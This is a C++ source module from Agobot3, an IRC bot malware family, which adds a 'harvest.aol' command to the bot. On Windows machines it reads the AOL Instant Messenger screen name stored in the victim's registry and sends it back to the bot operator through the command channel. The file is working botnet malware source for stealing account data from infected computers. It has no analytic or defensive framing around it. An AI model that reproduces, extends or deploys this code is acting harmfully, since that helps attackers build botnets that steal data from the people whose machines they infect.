/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#ifdef __COMPILE_HARVEST_AOL__
#include "harvest_aol.h"

bool CHarvest_AOL::Init() { return true; }

bool CHarvest_AOL::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare(m_cmdAOL.szName))
	{
#ifdef WIN32
        
	    /* harvest aim sn - evilbyte */
		HKEY hRegKey;
	    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\America Online\\AOL Instant Messenger (TM)\\CurrentVersion\\Login", 0, KEY_ALL_ACCESS, &hRegKey) != ERROR_SUCCESS)
		    return true;

	    char cAIM[256];
	    unsigned long type, length;

	    memset(cAIM, 0, sizeof(cAIM));
	    length = sizeof(cAIM);

	    if (RegQueryValueEx(hRegKey, "Screen Name", 0, &type, (BYTE *)cAIM, &length) != ERROR_SUCCESS)
		{
		    RegCloseKey(hRegKey);
		    return true;
		}

	    cAIM[length] = 0;
	    RegCloseKey(hRegKey);

		pMsg->pReply->DoReplyF(pMsg, "Found AIM sn (%s).", cAIM);

#endif // WIN32
	}
	
    return true; 
}

REGOBJ(CHarvest_AOL, g_pHarvest_AOL, false, 0);
REGCMD(m_cmdAOL,	"harvest.aol",		false, g_pHarvest_AOL);

#endif // __COMPILE_HARVEST_AOL__
